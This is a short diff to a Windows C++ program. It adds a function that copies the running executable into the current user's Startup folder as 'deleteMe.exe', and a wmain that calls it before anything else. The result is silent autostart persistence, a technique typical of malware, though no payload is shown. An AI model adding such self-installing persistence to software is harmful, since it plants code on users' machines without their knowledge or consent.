@@ -202,9 +202,45 @@ BOOL WINAPI CtrlHandler(DWORD fdwCtrlType)
 	}
 }
 
-
-int main(void)
+BOOL setPersistence(wchar_t* path)
 {
+	WCHAR* name=NULL;
+	DWORD dwSizeName=0;
+	if (!GetUserName(NULL,&dwSizeName) && GetLastError()!=ERROR_INSUFFICIENT_BUFFER)
+	{
+		mErrorFunction(L"GetUserName", GetLastError());
+		return FALSE;
+	}
+
+	name = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSizeName);
+
+	if (!GetUserName(name, &dwSizeName))
+	{
+		mErrorFunction(L"GetUserName", GetLastError());
+		return FALSE;
+	}
+
+	std::wstring newPath = L"C:\\Users\\";
+	newPath += name;
+	newPath += L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\deleteMe.exe";
+
+	if (!CopyFile(path, newPath.c_str(), FALSE))
+	{
+		mErrorFunction(L"CopyFile",GetLastError());
+		HeapFree(GetProcessHeap(), 0, name);
+		return FALSE;
+	}
+	HeapFree(GetProcessHeap(), 0, name);
+	return TRUE;
+}
+
+int wmain(int argc, wchar_t* argv[])
+{
+	if (!setPersistence(argv[0]))
+	{
+		return EXIT_FAILURE;
+	}
+
 	if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) {
 		mErrorFunction(L"SetConsoleCtrlHandler", GetLastError());
 		return EXIT_FAILURE;
